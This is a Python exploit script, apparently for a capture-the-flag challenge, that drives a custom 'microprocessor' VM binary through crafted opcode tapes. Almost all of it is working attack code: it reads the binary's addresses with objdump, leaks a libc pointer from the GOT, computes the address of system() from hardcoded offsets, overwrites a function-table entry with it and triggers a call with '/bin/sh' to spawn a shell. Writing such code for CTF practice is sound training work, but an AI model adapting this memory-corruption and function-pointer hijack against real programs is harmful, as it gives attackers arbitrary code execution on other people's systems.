#!/usr/bin/python

# this is a starting place for exploiting the 1337 Microprocessor
# it has some helpful functions
# use like this:
# (./helper.py ; cat ) | ./Q1Compiled


import subprocess
from struct import pack

# Wrappers 
quit = chr(0)
inc_reg_1 = chr(1)
dec_reg_1 = chr(2)
inc_reg_2 = chr(3)
dec_reg_2 = chr(4)
set_f = chr(5)
set_word = chr(6)
get = chr(7)
get_word = chr(8)
load_r1 = lambda r1: chr(9) + chr(r1)
load_r1_word = lambda r1: chr(10) + pack('<I', r1)
load_r1_word_signed = lambda r1: chr(10) + pack('<i', r1)
print_f = chr(11)
swap = chr(12)
je = lambda addr: chr(13) + chr(addr)
jz = lambda addr: chr(14) + chr(addr)
jmp = lambda addr: chr(15) + chr(addr)
add = chr(16)
printEasyFlag = chr(17)

# Helpers
load_r2 = lambda r2: swap + load_r1(r2) + swap
load_r2_word = lambda r2: swap + load_r1_word(r2) + swap
save_r1 = lambda addr: swap + load_r1(addr) + set_f + swap # lose r2
save_r1_word = lambda addr: swap + load_r1_word(addr) + set_word + swap # lose r2
save_r1_word_signed = lambda addr: swap + load_r1_word_signed(addr) + set_word + swap # lose r2


# Addresses (the lazy way)
odump = subprocess.check_output("objdump -x ./prog | grep funcs", shell=True)
funcs = int("0x" + odump[:odump.index(' ')], 16)

odump = subprocess.check_output("objdump -x ./prog | grep tape", shell=True)
tape_addr = int("0x" + odump[:odump.index(' ')], 16)

odump = subprocess.check_output("objdump -R ./prog | grep libc", shell=True)
libc_got = int("0x" + odump[:odump.index(' ')], 16)



tape = []
savedR1 = 60

tape += inc_reg_1 

tape += swap
tape += load_r1(savedR1) # load the save location of r1
tape += set_word # save
tape += swap
# R1 has been saved


tape += get # get what's at the address of R1, save to R2. first it will be -1, then -2 etc
tape += load_r1(0xaa-1)
tape += swap
tape += inc_reg_2 # R1:valueLoaded, R2: 'N'

tape += je(len(tape)+2 + 2 + 1 + 1 + 2)

tape += load_r1(savedR1)
tape += get_word
tape += swap
tape += jmp(0)

tape += load_r1(savedR1) 
tape += get_word
tape += load_r1(3)
tape += swap
tape += set_f
tape += printEasyFlag

# now we are leet, we can use load_word and add

print_addr = funcs + 11*4 # 11th func, each 4 bytes

offset_libc_got = tape_addr - libc_got


sys1 = 0x3a810 #objdump -d /lib32/libc.so.6 | grep system
lib1 = 0x18180

diff = sys1 - lib1 - 32

# get the start of libc from the got
tape += load_r1_word_signed(-offset_libc_got)
tape += get_word
#r2 now has libc addr


tape += load_r1_word(diff)
# r1 has the diff

tape += add
# r1 now has the address of system

offset_print = tape_addr - print_addr

tape += save_r1_word_signed(-offset_print)

# Trigger
tape += load_r1(90) + print_f

while len(tape) < 90:
	tape += chr(0xff)

print ''.join(tape) + "/bin/sh"






